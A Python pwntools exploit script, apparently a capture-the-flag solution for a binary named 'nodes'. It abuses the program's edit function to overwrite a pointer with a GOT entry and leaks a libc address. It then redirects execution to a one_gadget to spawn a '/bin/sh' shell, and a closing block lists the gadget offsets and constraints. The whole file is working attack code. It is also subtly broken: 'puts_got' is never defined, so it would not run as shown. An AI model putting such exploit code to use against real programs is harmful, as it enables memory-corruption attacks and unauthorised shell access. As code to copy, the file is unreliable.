#!/usr/bin/env python
#encoding: utf-8
from pwn import *
context.log_level = "debug"

binary = "./nodes"
e = ELF(binary)
e.checksec()
io = process(binary)
LIBC = './libc.so.6'
libc = ELF(LIBC)

LIBC_PUTS = libc.symbols['puts']
LIBC_SYSTEM = libc.symbols['system']

#gdb.attach(io, '''
#	watch *0x804A050
#	break *0x8048857
#''')

def insert(value, data):
	io.recvuntil("please input your choice:")
	io.sendline("1")
	io.recvuntil("Value:")
	io.sendline(str(value))
	io.recvuntil("Data:")
	io.sendline(data)

def edit(value_old, value, data):
	io.recvuntil("please input your choice:")
	io.sendline("2")
	io.recvuntil("Node's value:")
	io.sendline(str(value_old))
	io.recvuntil("New value:")
	io.sendline(str(value))
	io.recvuntil("New data:")
	io.sendline(data)

def show():
	io.recvuntil("please input your choice:")
	io.sendline("3")

def insert_e():
	io.recvuntil("please input your choice:")
	io.sendline('1')
	io.recvuntil("Value:")
	io.sendline('1')


for i in range(10):
	insert(i, 'a')

for i in range(90):
	insert_e()

edit(0, 0, 'a'*0x30 + pack(puts_got))

io.recvuntil("\n\nValue:")
data = io.recv(10)
print hex(int(data))
puts_addr = int(data)
libc_addr = puts_addr - LIBC_PUTS
system_addr = libc_addr + LIBC_SYSTEM

#route 1
#edit(0, 0, "/bin/sh\x00")
#edit(int(data), system_addr, 'a')

#route 2
one_gadget = 0x5fbc6 + libc_addr
edit(int(data), one_gadget, '')


io.recvuntil("please input your choice:")
io.sendline('3')
io.interactive()
'''
0x3ac69	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the address of `rw-p` area of libc
  [esp+0x34] == NULL

0x5fbc5	execl("/bin/sh", eax)
constraints:
  esi is the address of `rw-p` area of libc
  eax == NULL

0x5fbc6	execl("/bin/sh", [esp])
constraints:
  esi is the address of `rw-p` area of libc
  [esp] == NULL
'''

